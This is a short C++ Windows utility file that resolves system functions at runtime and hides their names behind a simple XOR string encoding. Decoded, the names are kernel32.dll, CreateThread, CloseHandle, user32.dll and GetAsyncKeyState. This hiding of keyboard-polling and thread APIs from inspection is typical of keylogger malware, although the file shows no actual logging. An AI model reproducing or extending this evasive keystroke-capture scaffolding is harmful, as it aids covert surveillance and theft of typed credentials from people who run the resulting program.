#include "utils/nv_windows.h"
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>

namespace nv { namespace windows {

    static void *(__stdcall *create_threadfn)(void *attr,
    size_t dwStackSize, void *pFunc, void *pParam, unsigned long dwFlags, unsigned long *tid);
    void (__stdcall *CloseHandle)(void *handle);
    short (__stdcall *GetKey)(int vKey);

    static void __SetValue(const char *v, char *b)
    {
        memset(b, 0, 260);
        strcat(b, v);
    }

    void EncryptedString(char *str, unsigned long val)
    {
        int           i, pos;
        unsigned char *v, *ch, xo;

        i = 0;
        v = (unsigned char*)&val;
        while( *str != 0 ) {
            pos = i / 2;
            ch = (unsigned char*)str;
            xo = ( i % 2 ) == 0 ?
                (v[pos] & 0xF) :
                (v[pos]) >> 4 & 0xF;
            *ch ^= xo;

            if( ++i == sizeof(unsigned long) * 2 ) {
                i = 0;
            }
            str++;
        }
    }

    void *CreateThread(void *pFunc, void *pParam)
    {
        return create_threadfn(0, 0, pFunc, pParam, 0, 0);
    }

    bool Init()
    {
        HMODULE dll;
        char    buffer[260];

        __SetValue("kg{nan74.fel", buffer);
        EncryptedString(buffer, 0x64240920);
        dll = GetModuleHandleA(buffer);
        if( dll != 0 ) {
            __SetValue("CplapgPnrghd", buffer);
            EncryptedString(buffer, 0x64240920);
            *(void**)&create_threadfn = (void*)GetProcAddress(dll, buffer);
            __SetValue("CnfsaJehdnl", buffer);
            EncryptedString(buffer, 0x64240920);
            *(void**)&CloseHandle = (void*)GetProcAddress(dll, buffer);
        } else {
            return false;
        }

        __SetValue("uqlr70*bln", buffer);
        EncryptedString(buffer, 0x64240920);
        dll = GetModuleHandleA(buffer);
        if( dll != 0 ) {
            __SetValue("Gg}Aw{jeKgpSpcpc", buffer);
            EncryptedString(buffer, 0x64240920);
            *(void**)&GetKey = (void*)GetProcAddress(dll, buffer);
        } else {
            return false;
        }

        return true;
    }
}}
